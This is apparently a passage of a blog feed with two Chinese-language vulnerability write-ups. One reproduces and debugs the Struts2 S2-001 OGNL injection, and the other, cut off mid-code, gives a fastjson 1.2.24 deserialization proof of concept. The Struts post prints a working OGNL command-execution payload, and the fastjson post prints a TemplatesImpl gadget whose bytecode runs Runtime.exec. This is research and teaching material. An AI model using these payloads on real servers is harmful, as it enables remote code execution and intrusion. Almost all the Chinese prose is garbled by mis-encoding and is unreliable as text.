<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>username éšä¾¿å¡«ï¼Œpasswordå¡«pocï¼Œæ³¨æ„éœ€è¦urlç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">    #a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">    #b&#x3D;#a.getInputStream(),</span><br><span class="line">    #c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line">    #d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line">    #e&#x3D;new char[50000],</span><br><span class="line">    #d.read(#e),</span><br><span class="line">    #f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">    #f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">    #f.getWriter().flush(),</span><br><span class="line">    #f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœå¦‚ä¸‹<br><img src="./1570088933307.png" alt="Alt text"></p>
<h2 id="é¢„å¤‡çŸ¥è¯†-OGNL"><a href="#é¢„å¤‡çŸ¥è¯†-OGNL" class="headerlink" title="é¢„å¤‡çŸ¥è¯†-OGNL"></a>é¢„å¤‡çŸ¥è¯†-OGNL</h2><p>s2çš„å¾ˆå¤šrceæ´éƒ½æ˜¯æäº¤çš„ognlè¡¨è¾¾å¼è¢«æœåŠ¡ç«¯è§£ææ‰§è¡Œè€Œé€ æˆï¼Œæœ‰å¿…è¦åœ¨ä¹‹å‰å…ˆä½œä¸€å®šçš„äº†è§£ã€‚</p>
<h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>OGNLå…¨ç§°æ˜¯å¯¹è±¡è§†å›¾å¯¼èˆªè¯­è¨€ï¼ˆObject-Graph Navigation Languageï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚</p>
<h3 id="OGNL-çš„ä½¿ç”¨"><a href="#OGNL-çš„ä½¿ç”¨" class="headerlink" title="OGNL çš„ä½¿ç”¨"></a>OGNL çš„ä½¿ç”¨</h3><p>ä¼ ç»Ÿçš„OGNLå¯ä»¥æ”¾ä¸€ä¸ªObjectåˆ°rootï¼Œæ”¾ä¸€ä¸ªMapåˆ°valuesï¼ˆå¾ˆå¤šæ–‡ç« éƒ½å«å®ƒContextï¼‰ã€‚<br><img src="./1570103787183.png" alt="Alt text"></p>
<p>è·å–rootã€Contextçš„å€¼æˆ–æ‰§è¡Œå…¶å†…éƒ¨æ–¹æ³•çš„æ–¹å¼éƒ½å·®ä¸å¤šï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯è·å–Contextä¸‹çš„ä¿¡æ¯æ—¶éœ€è¦åŠ å‰ç¼€<code>#key</code>æˆ–<code>@key</code>(é™æ€å˜é‡ï¼Œé™æ€æ–¹æ³•)ï¼Œçœ‹ä¸‹é¢ä¾‹å­ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ognltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OgnlTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">        User.fun1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">        <span class="comment">//å‡†å¤‡root</span></span><br><span class="line">        User u1 = <span class="keyword">new</span> User(<span class="string">"user1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å‡†å¤‡context</span></span><br><span class="line">        Map&lt;String,User&gt; context = <span class="keyword">new</span> HashMap&lt;String,User&gt;();</span><br><span class="line">        context.put(<span class="string">"key"</span>, <span class="keyword">new</span> User(<span class="string">"user2"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è®¾ç½®rootå’Œcontext</span></span><br><span class="line">        OgnlContext ognl = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        ognl.setRoot(u1);</span><br><span class="line">        ognl.setValues(context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å–å‡ºrootä¸­çš„æ•°æ®ï¼Œç›´æ¥å†™å±æ€§å</span></span><br><span class="line">        String rootname = (String) Ognl.getValue(<span class="string">"name"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å–å‡ºcontextä¸­çš„å±æ€§å€¼</span></span><br><span class="line">        <span class="comment">//#ä»£è¡¨ä»contextä¸­å–å€¼</span></span><br><span class="line">        String contextname = (String) Ognl.getValue(<span class="string">"#key.name"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¿®æ”¹rootä¸­æ•°æ®</span></span><br><span class="line">        Ognl.getValue(<span class="string">"name = 'user3'"</span>, ognl, ognl.getRoot());</span><br><span class="line">        rootname = (String) Ognl.getValue(<span class="string">"name"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¿®æ”¹contextä¸­æ•°æ®</span></span><br><span class="line">        Ognl.getValue(<span class="string">"#key.name = 'user4'"</span>, ognl, ognl.getRoot());</span><br><span class="line">        contextname = (String) Ognl.getValue(<span class="string">"#key.name"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨rootä¸­æ–¹æ³•</span></span><br><span class="line">        Ognl.getValue(<span class="string">"setName('user5')"</span>, ognl, ognl.getRoot());</span><br><span class="line">        rootname = (String)Ognl.getValue(<span class="string">"whoami()"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨contextä¸­æ–¹æ³•</span></span><br><span class="line">        Ognl.getValue(<span class="string">"#key.setName('user6')"</span>, ognl, ognl.getRoot());</span><br><span class="line">        contextname = (String)Ognl.getValue(<span class="string">"#key.whoami()"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line">        String funcreturnvalue = (String) Ognl.getValue(<span class="string">"@com.example.ognltest.User@func2()"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(funcreturnvalue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨é™æ€å±æ€§</span></span><br><span class="line">        Double pi = (Double) Ognl.getValue(<span class="string">"@java.lang.Math@PI"</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(pi);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">whoami</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"I'm "</span> + <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">func2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Call static method func2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ç»“æœ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user1</span><br><span class="line">user2</span><br><span class="line">user3</span><br><span class="line">user4</span><br><span class="line">I&#39;m user5</span><br><span class="line">I&#39;m user6</span><br><span class="line">Call static method func2</span><br><span class="line">3.141592653589793</span><br></pre></td></tr></table></figure>

<h3 id="struts2ä¸­çš„OGNL"><a href="#struts2ä¸­çš„OGNL" class="headerlink" title="struts2ä¸­çš„OGNL"></a>struts2ä¸­çš„OGNL</h3><p>åœ¨Struts2 ä¸­æœ‰ä¸ªå€¼æ ˆå¯¹è±¡å³ValueStackã€‚è€Œè¯´å¾—é€šä¿—äº›ï¼Œè¿™ä¸ªå€¼æ ˆå°±æ˜¯OgnlContextã€‚ValueStackå†…éƒ¨å°è£…äº†ä¸€ä¸ªCompoundRootç±»å‹çš„å¯¹è±¡ä½œä¸ºrootå±æ€§ï¼ŒCompoundRootæ˜¯ä¸€ä¸ªç»§æ‰¿ArrayListçš„æ ˆå­˜å‚¨ç»“æ„ã€‚è€Œæ‰€æœ‰è¢«å‹å…¥æ ˆä¸­çš„å¯¹è±¡ï¼Œéƒ½ä¼šè¢«è§†ä¸ºOGNLçš„Rootå¯¹è±¡ã€‚åœ¨ä½¿ç”¨OGNLè®¡ç®—è¡¨è¾¾å¼æ—¶ï¼Œé¦–å…ˆä¼šå°†æ ˆé¡¶å…ƒç´ ä½œä¸ºRootå¯¹è±¡ï¼Œè¿›è¡Œè¡¨è¾¾å¼åŒ¹é…ï¼ŒåŒ¹é…ä¸æˆåŠŸåˆ™ä¼šä¾æ¬¡å‘ä¸‹åŒ¹é…ï¼Œæœ€åè¿”å›ç¬¬ä¸€ä¸ªæˆåŠŸåŒ¹é…çš„è¡¨è¾¾å¼è®¡ç®—ç»“æœã€‚<strong>å› æ­¤ï¼ŒStruts2é€šè¿‡ValueStackå®ç°äº†å¤šRootå¯¹è±¡çš„OGNLæ“ä½œ</strong>ã€‚</p>
<p>å½“ä½ æäº¤ä¸€ä¸ªè¯·æ±‚ï¼Œä¼šä¸ºè¿™ä¸ªè¯·æ±‚åˆ›å»ºä¸€ä¸ªå’Œwebå®¹å™¨äº¤äº’çš„ActionContextï¼Œä¸æ­¤åŒæ—¶ä¼šåˆ›å»ºValueStackï¼Œå¹¶ç½®äºActionContextä¹‹ä¸­ã€‚è€Œå®ä¾‹åŒ–Actionä¹‹åï¼Œå°±ä¼šå°†è¿™ä¸ªactionå¯¹è±¡å‹å…¥ValueStackä¸­ã€‚åœ¨è¯·æ±‚â€œæ˜ å°„â€è¿‡ç¨‹ä¸­ï¼ŒStruts2åˆ™æ˜¯é€šè¿‡ParametersInterceptoræ‹¦æˆªå™¨å°†æäº¤çš„å‚æ•°å€¼å°è£…å…¥å¯¹åº”çš„Actionå±æ€§ä¸­ã€‚å› æ­¤actionå®ä¾‹å¯ä»¥ä½œä¸ºOGNLçš„Rootå¯¹è±¡ï¼Œå¯¹äºActionä¸­çš„å±æ€§ã€æ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨OGNLæ¥è·å–ã€‚</p>
<p><img src="./1570282080999.png" alt="Alt text"></p>
<h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><p>é¦–å…ˆæ˜¯ä¸‹æ–­ç‚¹çš„ä½ç½®ï¼Œåœ¨è‡ªå·±å°è¯•è°ƒè¯•ä¹‹å‰ï¼Œè¯»å–äº†ä¸€äº›å‰äººçš„æ–‡ç« ï¼Œä»–ä»¬çš„æ–­ç‚¹çš„ä½ç½®å¤§éƒ¨åˆ†éƒ½åœ¨<br><code>com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>çš„<code>doIntercept</code>æ–¹æ³•ä¸Šé¢ã€‚<br><img src="./1570091708205.png" alt="Alt text"></p>
<p>ç¢ç£¨äº†ä¸€ä¸‹æ–­ç‚¹æ‰“åœ¨ParametersInterceptoræ‹¦æˆªå™¨è¿™é‡Œçš„å¥½å¤„</p>
<ul>
<li>ä¸ç”¨è°ƒè¯•tomcatè‡ªèº«çš„ä»£ç ï¼Œè¿™é‡Œä¸‹æ–­ç‚¹å·²æ˜¯tomcatå·²ç»æŠŠâ€œæ§åˆ¶æƒâ€ç§»äº¤ç»™strustä¹‹åäº†ã€‚</li>
<li>æ‹¦æˆªå™¨åªèƒ½å¯¹actionè¯·æ±‚èµ·ä½œç”¨ï¼Œè€Œè¿‡æ»¤å™¨åˆ™å¯ä»¥å¯¹å‡ ä¹æ‰€æœ‰çš„è¯·æ±‚èµ·ä½œç”¨ï¼ˆä¸€å¼€å§‹æƒ³çš„æ˜¯åœ¨web.xmlä¸­é…ç½®çš„struts2è¿‡æ»¤å™¨org.apache.struts2.dispatcher.FilterDispatcherå¤„æ‰“æ–­ç‚¹ï¼‰</li>
<li>ParametersInterceptoræ˜¯æ‹¦æˆªå™¨ï¼Œåœ¨è¿™é‡Œä¸‹æ–­ç‚¹åˆšå¥½æ˜¯åœ¨æ‰§è¡Œä¸šåŠ¡é€»è¾‘ä¹‹å‰ï¼Œå¹¶ä¸”ParametersInterceptoræ˜¯struts2çš„ç¼ºçœä¼šç”¨åˆ°çš„æ‹¦æˆªå™¨ä¹‹ä¸€ã€‚</li>
<li>ParametersInterceptoræ‹¦æˆªå™¨çš„ä½œç”¨æ˜¯æŠŠä¼ æ¥çš„å‚æ•°èµ‹å€¼ç»™POJOï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯payloadâ€œå…¥ä¾µâ€çš„èµ·ç‚¹ã€‚</li>
</ul>
<p><img src="./1570536206343.png" alt="Alt text"><br>xx<br><img src="./1570536642779.png" alt="Alt text"></p>
<p><img src="./1570536884573.png" alt="Alt text"></p>
<p>æ¥ä¸‹æ¥ä¼šè¿›è¡Œå¾ˆå¤štomcatçš„å†…éƒ¨æ“ä½œï¼Œè¿™é‡Œå•æ­¥è·Ÿè¿›IDEAä¼šæ‰¾ä¸åˆ°ç›¸åº”çš„ä»£ç ï¼Œä¸€å¼€å§‹å¡è¿™äº†ï¼Œåæ¥çœ‹äº†åˆ«äººçš„æ–‡ç« ä¹Ÿé‡åˆ°è¿‡è¿™ç§æƒ…å†µã€‚<br><img src="./1570537034455.png" alt="Alt text"></p>
<p>æ–‡ç« æåˆ°å¤šæ¬¡æ­¥å…¥ï¼Œå¤ç°çš„æ—¶å€™ä¸€ç›´è‡³å°‘è·Ÿäº†å‡ åæ¬¡æ­¥å…¥ä¹Ÿæ²¡è·Ÿåˆ°æ–‡ç« æ‰€è¿°ä½ç½®ï¼Œä¼°è®¡å®é™…æè¦ç‚¹å‡ ç™¾æ¬¡å§ï¼Œç›´æ¥å®šä½åˆ°<code>rg.apache.struts2.views.jsp.ComponentTagSupport</code>ä¸‹æ–­ç‚¹è·³äº†ã€‚<br><img src="./1570537304070.png" alt="Alt text"></p>
<p>å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œå®é™…ä¸Šæ˜¯è§£æjspæ¨¡ç‰ˆäº†ï¼Œå…ˆè§£æçš„æ˜¯jspä¸­usernameæ¡†ï¼Œåè§£æçš„æ˜¯passwordæ¡†ï¼Œæˆ‘ä»¬æ˜¯ä»passwordä¼ å…¥çš„payloadæ‰€ä»¥ç¬¬ä¸€æ¬¡å…ˆè·³è¿‡ã€‚<br>æœ€ç»ˆè§¦å‘ç‚¹æ˜¯åœ¨doEndTagæ—¶çš„æ“ä½œï¼Œä»”ç»†çœ‹çœ‹<br><img src="./1570537486964.png" alt="Alt text"></p>
<p>eveluateParamså¤„ç†ä¼ å…¥çš„å‚æ•°<br><img src="./1570537522443.png" alt="Alt text"></p>
<p>é»˜è®¤æ”¯æŒaltSyntaxï¼Œæ‰€ä»¥ä¼šæŠŠpsswordå˜æˆ<code>%{password}</code>å½“oglnè¡¨è¾¾å¼è§£æã€‚ï¼ˆstruts.tag.altSyntax è¯¥å±æ€§æŒ‡å®šæ˜¯å¦å…è®¸åœ¨Struts 2æ ‡ç­¾ä¸­ä½¿ç”¨è¡¨è¾¾å¼è¯­æ³•,å› ä¸ºé€šå¸¸éƒ½éœ€è¦åœ¨æ ‡ç­¾ä¸­ä½¿ç”¨è¡¨è¾¾å¼è¯­æ³•,æ•…æ­¤å±æ€§åº”è¯¥è®¾ç½®ä¸ºtrue,è¯¥å±æ€§çš„é»˜è®¤å€¼æ˜¯trueï¼‰<br><img src="./1570537576268.png" alt="Alt text"></p>
<p>è·Ÿå…¥addParameteræ—¶çš„findValue<br><img src="./1570537598128.png" alt="Alt text"></p>
<p>é—®é¢˜å¤„åœ¨while True + Stack.findValueé€ æˆäº†å¯¹oglnçš„é€’å½’è§£æ<br><img src="./1570537828133.png" alt="Alt text"></p>
<p>ç¬¬ä¸€æ¬¡ï¼Œæå–å‡º%{password}å†…å®¹å³payload<br><img src="./1570540179445.png" alt="Alt text"></p>
<p>ç¬¬äºŒæ¬¡ï¼ŒæŠŠæå‡ºæ¥çš„payloadå†æ¬¡å½“ognlè¡¨è¾¾å¼æ‰§è¡Œï¼Œè§¦å‘RCE<br><img src="./1570538429199.png" alt="Alt text"></p>
<p><img src="./1570540863586.png" alt="Alt text"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">ä»é›¶å¼€å§‹å­¦ä¹ Struts2 S2-001</a><br><a href="https://xz.aliyun.com/t/2044">ã€Struts2-å‘½ä»¤-ä»£ç æ‰§è¡Œæ¼æ´åˆ†æç³»åˆ—ã€‘S2-001</a><br><a href="https://blog.csdn.net/sofia_fhx/article/details/84111414">IDEAä¸­åˆ›å»ºmavené¡¹ç›®æ²¡æœ‰javaå’Œresourceså­æ–‡ä»¶çš„è§£å†³</a><br><a href="https://www.jianshu.com/p/00585bfc5a94">OGNL</a><br><a href="https://www.jellythink.com/archives/283">Struts2å­¦ä¹ ä¹‹OGNLè¡¨è¾¾å¼</a><br><a href="JSPä¹å¤§å†…ç½®å¯¹è±¡åˆ†æ">JSPä¹å¤§å†…ç½®å¯¹è±¡åˆ†æ</a><br><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">S2-001è°ƒè¯•åˆ†æ</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson ååºåˆ—åŒ–æµç¨‹ç¡¬æ ¸è·Ÿè¸ª</title>
    <url>/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/</url>
    <content><![CDATA[<!-- fastjsonç”¨äºå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²,ä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚ -->
<!-- more -->

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lisan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>learnfastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Poc.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/Test.class"</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Test.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    </span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t &#x3D; new Test();</span><br><span class="line">    